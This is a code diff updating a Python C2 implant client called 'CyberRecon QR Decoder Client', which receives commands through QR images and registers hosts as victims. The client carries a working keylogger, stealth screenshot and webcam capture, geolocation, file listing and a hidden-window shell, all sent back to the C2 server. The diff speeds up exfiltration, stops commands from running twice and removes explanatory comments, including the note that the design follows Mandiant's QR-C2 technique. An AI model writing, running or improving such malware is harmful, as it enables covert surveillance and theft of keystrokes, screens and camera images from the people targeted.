@@ -1,7 +1,11 @@
 """
-CyberRecon QR Decoder Client (v2 - Auto-register ready)
+CyberRecon QR Decoder Client (v3 - Fast + Deduplicated)
 Uses headless Chrome + OpenCV to decode QR commands.
-All modules: stealth screenshot, webcam, REAL keylogger, GPS, clipboard, system info, process list.
+Fixes:
+  - Deduplicate commands (no double-execution)
+  - JPEG screenshots (10x faster than PNG)
+  - No fake webcam fallback (no browser-screenshot-as-webcam)
+  - 1s default poll interval
 """
 
 import base64
@@ -20,12 +24,6 @@ from selenium.webdriver.chrome.options import Options
 
 
 class KeyloggerModule:
-    """
-    Real keystroke capture using pynput.
-    Runs in a background thread, buffers keystrokes,
-    and flushes chunks to the C2 server every N seconds.
-    """
-
     def __init__(self, exfil_callback):
         self.exfil_callback = exfil_callback
         self.buffer = ""
@@ -35,7 +33,6 @@ class KeyloggerModule:
         self.flush_thread = None
 
     def _on_press(self, key):
-        """Called on every keypress. Append representation to buffer."""
         try:
             with self.buffer_lock:
                 self.buffer += key.char
@@ -57,7 +54,6 @@ class KeyloggerModule:
                     self.buffer += f"[{str(key).replace('Key.', '').upper()}]"
 
     def _flush_loop(self, interval=15):
-        """Periodically send buffered keystrokes to C2."""
         while self.active:
             time.sleep(interval)
             with self.buffer_lock:
@@ -112,8 +108,11 @@ class QRDecoder:
         })
         self.keylogger = KeyloggerModule(self._exfil)
 
+        # FIX: deduplicate executed commands by ID
+        self.seen_ids = set()
+        self.seen_lock = threading.Lock()
+
     def register_with_c2(self, hostname="DESKTOP-VICTIM", os_name="Windows 11", user="Admin"):
-        """Register with C2 server and adopt the assigned victim ID."""
         try:
             r = self.session.post(
                 f"{self.c2_url}/register",
@@ -123,20 +122,13 @@ class QRDecoder:
             data = r.json()
             self.victim_id = data["victim_id"]
             print(f"[+] Auto-registered. Victim ID: {self.victim_id}")
+            return True
         except Exception as e:
             print(f"[!] Auto-register failed: {e}")
+            return False
 
     def init_headless_browser(self):
-        """
-        Initialize headless Chrome for the QR visual channel.
-
-        Mandiant's QR-C2 technique relies on a real browser rendering
-        the QR PNG as pixels — this is what browser isolation cannot
-        strip. Falls back gracefully if Chrome is unavailable.
-        """
         chrome_options = Options()
-
-        # Stealth / headless
         chrome_options.add_argument("--headless=new")
         chrome_options.add_argument("--no-sandbox")
         chrome_options.add_argument("--disable-dev-shm-usage")
@@ -145,10 +137,6 @@ class QRDecoder:
         chrome_options.add_argument("--disable-blink-features=AutomationControlled")
         chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
         chrome_options.add_experimental_option("useAutomationExtension", False)
-
-        # Camera / mic / notifications — auto-grant (simulates user consent
-        # in isolated browser environments). Without this, some RBI products
-        # block dynamic media access before the QR renders.
         chrome_options.add_argument("--use-fake-ui-for-media-stream")
         chrome_options.add_argument("--use-fake-device-for-media-stream")
         chrome_options.add_experimental_option("prefs", {
@@ -171,24 +159,15 @@ class QRDecoder:
             self.driver = None
 
     def capture_qr_screenshot(self) -> np.ndarray:
-        """
-        Fetch the QR PNG.
-
-        Primary path: Selenium renders it in real Chrome (matches Mandiant
-        technique — visual pixel channel).
-        Fallback path: direct HTTP fetch when Chrome is unavailable.
-        """
         qr_url = f"{self.c2_url}/qr/{self.victim_id}"
 
         if self.driver:
-            # Real-browser path
             self.driver.get(qr_url)
-            time.sleep(0.5)
+            time.sleep(0.3)
             screenshot = self.driver.get_screenshot_as_png()
             img = Image.open(BytesIO(screenshot))
             return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
 
-        # Fallback — direct fetch
         resp = self.session.get(qr_url, timeout=5)
         resp.raise_for_status()
         img = Image.open(BytesIO(resp.content)).convert("RGB")
@@ -206,7 +185,7 @@ class QRDecoder:
             print(f"[!] Decode error: {e}")
             return None
 
-    def listen_for_commands(self, interval: int = 5):
+    def listen_for_commands(self, interval: int = 1):
         print(f"[+] Starting QR C2 listener for victim: {self.victim_id}")
         print(f"[+] Polling interval: {interval}s")
         print("-" * 50)
@@ -218,9 +197,22 @@ class QRDecoder:
                 command = self.decode_qr_image(img)
 
                 if command:
+                    cmd_id = command.get("id")
+
+                    # FIX: skip duplicate QR reads (same command served twice)
+                    if cmd_id:
+                        with self.seen_lock:
+                            if cmd_id in self.seen_ids:
+                                print(f"[.] Skipping duplicate QR (id={cmd_id})")
+                                time.sleep(max(0, interval - (time.time() - start_time)))
+                                continue
+                            self.seen_ids.add(cmd_id)
+                            if len(self.seen_ids) > 500:
+                                self.seen_ids = set(list(self.seen_ids)[-200:])
+
                     latency = (time.time() - start_time) * 1000
                     print(f"[QR] Decoded: {command.get('cmd', 'unknown')} | "
-                          f"Latency: {latency:.0f}ms | ID: {command.get('id', 'N/A')}")
+                          f"Latency: {latency:.0f}ms | ID: {cmd_id or 'N/A'}")
                     self.execute_command(command)
                 else:
                     print("[.] No QR detected in frame")
@@ -262,44 +254,51 @@ class QRDecoder:
 
     def _handle_whoami(self, cmd):
         import getpass
-        import os
         result = f"{getpass.getuser()}@{os.environ.get('COMPUTERNAME', 'unknown')}"
         print(f"    -> whoami: {result}")
         self._exfil("whoami", result)
 
     def _handle_screenshot_stealth(self, cmd):
-        """STEALTH: Capture actual victim desktop (not the QR browser)."""
+        """Fast JPEG screenshot with downscale."""
         try:
             from PIL import ImageGrab
-            screenshot = ImageGrab.grab()
+            img = ImageGrab.grab()
+
+            # Downscale to max 1280px wide — huge speedup, still readable
+            max_w = 1280
+            if img.width > max_w:
+                ratio = max_w / img.width
+                img = img.resize((max_w, int(img.height * ratio)), resample=1)
+
             buf = BytesIO()
-            screenshot.save(buf, format='PNG')
-            b64_data = base64.b64encode(buf.getvalue()).decode('utf-8')
-            print(f"    -> [STEALTH] Real screen captured ({len(b64_data)} chars)")
+            img.convert("RGB").save(buf, format="JPEG", quality=70, optimize=False)
+            b64_data = base64.b64encode(buf.getvalue()).decode("utf-8")
+            print(f"    -> [STEALTH] Screenshot captured ({len(b64_data)} chars, JPEG)")
             self._exfil("screenshot", b64_data)
         except Exception as e:
-            print(f"    -> [!] Stealth screenshot failed: {e}")
-            self._exfil("screenshot", self.driver.get_screenshot_as_base64())
+            print(f"    -> [!] Screenshot failed: {e}")
+            if self.driver:
+                self._exfil("screenshot", self.driver.get_screenshot_as_base64())
 
     def _handle_webcam(self, cmd):
-        """Capture webcam frame; fall back to browser frame if no camera."""
+        """Real webcam only. No fake browser-screenshot fallback."""
         try:
             cap = cv2.VideoCapture(0)
             ret, frame = cap.read()
             cap.release()
             if ret and frame is not None:
-                _, buf = cv2.imencode(".jpg", frame)
+                _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                 b64 = base64.b64encode(buf).decode()
                 print(f"    -> Webcam frame captured ({len(b64)} chars)")
                 self._exfil("webcam", b64)
-                return
-            raise RuntimeError("no camera")
+            else:
+                print("    -> [!] No webcam device available")
+                self._exfil("webcam", "[no camera]")
         except Exception as e:
-            print(f"    -> [!] Webcam unavailable ({e})")
-            self._exfil("webcam", self.driver.get_screenshot_as_base64())
+            print(f"    -> [!] Webcam error: {e}")
+            self._exfil("webcam", f"[webcam error: {e}]")
 
     def _handle_keylogger(self, cmd):
-        """REAL keylogger: start/stop pynput listener, chunked exfil."""
         action = cmd.get("args", ["start"])[0]
         if action == "start":
             self.keylogger.start()
@@ -324,7 +323,6 @@ class QRDecoder:
         self._exfil("file", f"[FILE REQUEST LOGGED] {filepath}")
 
     def _handle_gps(self, cmd):
-        """Real GPS via Windows Location API, fallback to IP geolocation."""
         import platform
         import subprocess
 
@@ -364,7 +362,6 @@ class QRDecoder:
 
         if loc["latitude"] is None:
             try:
-                # nosemgrep — ip-api.com doesn't support HTTPS on free tier; data is public geolocation only
                 response = requests.get("http://ip-api.com/json/", timeout=5)
                 data = response.json()
                 if data.get("status") == "success":
@@ -414,7 +411,6 @@ class QRDecoder:
         self._exfil("system_info", info)
 
     def _handle_list_files(self, cmd):
-        import os
         path = cmd.get("args", ["C:/Users"])[0]
         try:
             files = os.listdir(path)[:20]
@@ -424,18 +420,10 @@ class QRDecoder:
             self._exfil("list_files", f"Error listing {path}: {e}")
 
     def _handle_shell(self, cmd):
-        """
-        Execute a shell command safely.
-
-        Security: uses shlex.split + shell=False to prevent command injection
-        (CWE-78). Rejects any input containing shell metacharacters.
-        """
         import shlex
         import subprocess
 
         raw = " ".join(cmd.get("args", ["whoami"]))
-
-        # Blocklist: refuse any command containing shell metacharacters
         blocked = set("|&;<>()`$\\\"'\n\r")
         if any(ch in raw for ch in blocked):
             msg = f"[blocked] Shell metacharacters not allowed: {raw}"
@@ -460,7 +448,6 @@ class QRDecoder:
                 "text": True,
                 "timeout": 10,
             }
-            # Windows: hide the spawned process window
             if hasattr(subprocess, "CREATE_NO_WINDOW"):
                 kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
 
@@ -506,25 +493,26 @@ def main():
     parser = argparse.ArgumentParser(description="CyberRecon QR C2 Decoder Client")
     parser.add_argument(
         "--c2",
-        default=os.getenv("CYBERRECON_C2", "http://127.0.0.1:8443"),
+        default=os.getenv("CYBERRECON_C2", "http://0.0.0.0:8443"),
         help="C2 server URL (or set CYBERRECON_C2 env var)",
     )
     parser.add_argument("--victim-id", help="Victim session ID")
     parser.add_argument("--hostname", default="DESKTOP-VICTIM", help="Hostname")
     parser.add_argument("--auto-register", action="store_true", help="Auto-register with C2")
-    parser.add_argument("--interval", type=int, default=5, help="QR poll interval (seconds)")
+    parser.add_argument("--interval", type=int, default=1, help="QR poll interval (seconds)")
     args = parser.parse_args()
 
     decoder = QRDecoder(args.c2, args.victim_id or "pending")
 
-    if args.auto_register:
-        decoder.register_with_c2(hostname=args.hostname)
-    elif not args.victim_id:
-        # Auto-register by default when no victim-id provided
+    if args.victim_id:
+        print(f"[*] Using provided victim-id: {args.victim_id}")
+    else:
         print("[*] No victim-id provided, auto-registering...")
-        decoder.register_with_c2(hostname=args.hostname)
+        ok = decoder.register_with_c2(hostname=args.hostname)
+        if not ok:
+            print("[!] Registration failed — client will run with placeholder ID and likely 404")
 
-    decoder.init_headless_browser()  # graceful no-op if Chrome unavailable
+    decoder.init_headless_browser()
 
     try:
         decoder.listen_for_commands(interval=args.interval)
